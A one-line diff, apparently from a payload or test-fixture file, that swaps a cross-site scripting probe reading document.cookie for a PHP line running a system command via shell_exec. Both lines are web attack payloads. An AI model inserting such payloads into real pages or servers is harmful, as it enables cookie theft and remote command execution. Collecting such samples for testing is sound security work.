@@ -1,1 +1,1 @@
-<iframe><script>alert(document.cookie);</script></iframe>
+<?php echo shell_exec("whoami");?>
